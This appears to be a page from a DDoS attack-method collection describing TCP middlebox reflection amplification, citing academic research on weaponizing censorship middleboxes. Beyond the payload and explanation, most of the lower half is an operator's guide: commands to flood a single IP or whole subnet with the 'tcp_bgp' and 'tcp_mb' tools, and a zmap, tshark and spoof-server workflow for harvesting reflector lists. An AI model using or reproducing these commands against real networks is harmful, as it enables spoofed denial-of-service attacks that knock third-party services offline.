# Middlebox

## Port: **80**

## Proto: **TCP**

## Amplification factor: **3x (200x for top 10k reflector)**

## Reflector count: ~90 milion (May, 2023)

---

### Payload

<pre>GET / HTTP/1.1\r\nHost: youporn.com\r\n\r\n</pre>

You can use any gambling, porn, torrent site instead youporn.com

### Response

<pre></pre>

### How does it work

- Some middleboxes do not perform handshake, allowing for reflection via spoofing.
- The attacker must be outside the censor, otherwise the packets will all be censored and lost.

Other links:

- https://github.com/breakerspace/weaponizing-censors
- https://geneva.cs.umd.edu/papers/usenix-weaponizing-ddos.pdf

## ---> [TCP BGP AMPLIFICATION]

This methods don't support random ports

The threading on this method is different, 12 should do around 250kpps

Example to attack single IP address

- ./tcp_bgp 1.1.1.1/32 80 bgp.txt 12 30 (single ip)

- Example to attack full subnet (cidr support)

- ./tcp_bgp 1.1.1.1/24 80 bgp.txt 12 30


This method needs to attack on random ports in order to work

- ./tcp_mb 1.1.1.1 middlebox.txt 1 -1 120

This needs a spoof server and another server

Replace <other-server-IP> with your other server IP and run this command on your spoof server

zmap -p 179 -o /dev/null -S <other-server-IP>

At same time, run this command on your other server

tshark -f 'ip[2:2] > 100 && src port 179 && tcp' > log.txt

Once the zmap is done you do CTRL + C to close tshark

Install Java if you already don't have installed

apt install default-jre -y

java -jar IPFilter.jar log.txt middlebox.txt
rm -rf log.txt